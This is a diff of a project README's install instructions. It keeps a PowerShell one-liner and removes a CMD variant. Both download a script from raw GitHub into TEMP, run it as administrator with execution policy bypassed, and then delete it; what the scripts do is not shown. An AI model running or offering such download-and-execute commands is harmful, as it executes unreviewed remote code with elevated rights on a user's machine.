@@ -36,18 +36,11 @@
 ### 🏃‍♂️ PowerShell One-Liner
 
 ```powershell
-iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1" -OutFile "$env:TEMP\sqd5dcwh.ps1"; Start-Process "powershell.exe" -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-File","$env:TEMP\sqd5dcwh.ps1" -Verb RunAs -Wait; Remove-Item "$env:TEMP\sqd5dcwh.ps1" -Force; iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.ps1" -OutFile "$env:TEMP\run.ps1"; powershell -NoProfile -ExecutionPolicy Bypass -File "$env:TEMP\run.ps1"; Remove-Item "$env:TEMP\run.ps1" -Force
 
-
-```
-
-### 📱 CMD Version
-
-```cmd
-powershell -Command "iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1' -OutFile '%TEMP%\sqd5dcwh.ps1'; Start-Process powershell.exe -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','%TEMP%\sqd5dcwh.ps1' -Verb RunAs -Wait; del '%TEMP%\sqd5dcwh.ps1'; iwr 'https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/run.ps1' -OutFile '%TEMP%\run.ps1'; powershell -NoProfile -ExecutionPolicy Bypass -File '%TEMP%\run.ps1'; del '%TEMP%\run.ps1'"
-
+iwr "https://raw.githubusercontent.com/09sychic/sqd5-with-dcwh/main/sqd5dcwh.ps1" -OutFile "$env:TEMP\sqd5dcwh.ps1"; Start-Process "powershell.exe" -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-File","$env:TEMP\sqd5dcwh.ps1" -Verb RunAs -Wait; Remove-Item "$env:TEMP\sqd5dcwh.ps1" -Force
 
 ```
+
 
 > [!CAUTION] > **REMEMBER:** Running these commands will:
 >
